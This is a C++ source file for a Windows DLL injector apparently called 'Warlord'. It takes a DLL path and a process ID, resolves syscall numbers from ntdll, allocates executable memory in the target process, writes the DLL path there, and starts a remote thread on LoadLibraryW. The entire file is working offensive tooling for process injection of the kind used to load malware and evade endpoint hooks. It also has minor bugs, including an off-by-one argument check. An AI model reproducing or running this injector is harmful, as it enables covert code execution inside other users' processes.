#include <iostream>
#include <Windows.h>
#include <string>
#include <filesystem>
#include "Warlord.h"

namespace fs = std::filesystem;

DWORD NtCreateThreadExSSN = 0;
DWORD NtWriteVirtualMemorySSN = 0;
DWORD NtAllocateVirtualMemorySSN = 0;


DWORD SyscallNum(HMODULE ntdllM, LPCSTR NtFunctionName)
{
	UINT_PTR NtAddress = NULL;
	DWORD SysCallNumber = 0;

	NtAddress = (UINT_PTR)GetProcAddress(ntdllM, NtFunctionName);

	if (NULL == (PVOID)NtAddress)
	{
		return 0;
	}
	SysCallNumber = ((PBYTE)(NtAddress + 0x4))[0];
	return SysCallNumber;
}

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		std::cout << "[-] Not enough arguments: Warlord.exe <Path> <PID>" << std::endl;
		return 0;
	}

	if (!fs::exists(argv[1]))
	{
		std::cout << "[-] DLL path doesnt exist!" << std::endl;
		return 0;
	}

	NTSTATUS STATUS = NULL;

	HMODULE ntdllH = GetModuleHandleW(L"NTDLL");

	NtAllocateVirtualMemorySSN = SyscallNum(ntdllH, (LPCSTR)"NtAllocateVirtualMemory");
	NtWriteVirtualMemorySSN = SyscallNum(ntdllH, (LPCSTR)"NtWriteVirtualMemory");
	NtCreateThreadExSSN = SyscallNum(ntdllH, (LPCSTR)"NtCreateThreadEx");

	if (NtAllocateVirtualMemorySSN == 0 || NtWriteVirtualMemorySSN == 0)
	{
		std::cout << "[-] Failed to get SSN of NtWriteVirtualMemory or NtAllocateVirtualMemory" << std::endl;
		return 0;
	}


	HANDLE hProcess;
	std::string PIDS = argv[2];
	int PID = std::stoi(PIDS);

	try
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	}
	catch (std::exception& ex)
	{
		std::cout << "[-] Couldn't open handle: " << ex.what() << std::endl;
		return 0;
	}
	std::cout << "[+] Opened ProcessHandle" << std::endl;
	HMODULE kn32 = GetModuleHandleW(L"kernel32");
	if (NULL == kn32)
	{
		std::cout << "[-] Couldnt open a handle to kernel32.dll" << std::endl;
		CloseHandle(hProcess);
		return 0;
	}
	std::cout << "[+] Opened Handle to kernel32" << std::endl;
	PVOID p_loadlibrary = GetProcAddress(kn32, "LoadLibraryW");
	if (p_loadlibrary == NULL)
	{
		std::cout << "[-] Failed to get loadlibraryw address" << std::endl;
		CloseHandle(hProcess);
		return 0;
	}
	std::cout << "[+] Got LoadLibraryW address!" << std::endl;
	std::string PATH = argv[1];
	PVOID pRemoteAddr = NULL;
	SIZE_T regionSize = 0x1000;
	std::wstring widePath(argv[1], argv[1] + strlen(argv[1]) + 1);
	SIZE_T stringByteSize = (widePath.length() + 1) * sizeof(wchar_t);
	STATUS = NtAllocateVirtualMemory(
		hProcess,
		&pRemoteAddr,
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(STATUS))
	{
		std::cout << "[-] Failed to allocate memory in targeted process!" << std::endl;
		CloseHandle(hProcess);
		return 0;
	}
	std::cout << "[+] Allocated Memory in target Process!" << std::endl;
	SIZE_T bytesWritten = 0;
	STATUS = NtWriteVirtualMemory(
		hProcess,
		pRemoteAddr,
		(PVOID)widePath.c_str(),
		stringByteSize,
		&bytesWritten
	);

	if (!NT_SUCCESS(STATUS))
	{
		std::cout << "[-] Failed to write memory" << std::endl;
		CloseHandle(hProcess);
		return 0;
	}
	std::cout << "[+] Wrote Memory!" << std::endl;
	HANDLE hThread = NULL;
	STATUS = NtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		hProcess,
		(PVOID)p_loadlibrary, 
		pRemoteAddr,
		FALSE,
		0, 0, 0,
		NULL
	);

	if (!NT_SUCCESS(STATUS))
	{
		std::cout << "[-] Failed to call LoadLibrary" << std::endl;
		CloseHandle(hProcess);
		return 0;
	}
	std::cout << "[+] Injected DLL!" << std::endl;
	CloseHandle(hProcess);

	return 0;
}